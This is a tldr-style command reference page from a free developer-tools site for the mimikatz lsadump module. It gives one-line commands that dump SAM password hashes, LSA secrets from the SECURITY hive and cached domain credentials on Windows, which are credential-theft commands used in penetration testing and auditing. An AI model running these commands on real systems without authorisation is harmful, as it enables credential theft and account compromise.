---
title: "Mimikatz LSADump - Dump Windows Secrets | Free DevTools"
name: mimikatz-lsadump
path: /freedevtools/tldr/windows/mimikatz-lsadump
canonical: "https://hexmos.com/freedevtools/tldr/windows/mimikatz-lsadump/"
description: "Dump Windows secrets with Mimikatz LSADump. Extract SAM hashes, SECURITY hive data, and cached domain credentials. Free online tool, no registration required."
category: windows
keywords:
- windows lsadump
- mimikatz lsadump
- windows credential dumping
- lsa secrets dumping
- sam hash extraction
- security hive extraction
- cached credentials retrieval
- domain credentials dumping
- windows password dumper
- windows security auditing
features:
- Dump SAM hashes from Windows systems
- Extract secrets from the Windows SECURITY hive
- Retrieve cached domain credentials
- Audit Windows local security
- Extract sensitive information using SYSTEM privileges
ogImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
twitterImage: "https://hexmos.com/freedevtools/t/tool-banners/json-utilities-banner.png"
---

# mimikatz lsadump

> Dump secrets from the Windows Local Security Authority (LSA).
> Requires SYSTEM privileges.
> More information: <https://github.com/gentilkiwi/mimikatz>.

- Dump SAM hashes:

`mimikatz "lsadump::sam"`

- Dump secrets from the SECURITY hive:

`mimikatz "lsadump::secrets"`

- Dump cached domain credentials:

`mimikatz "lsadump::cache"`
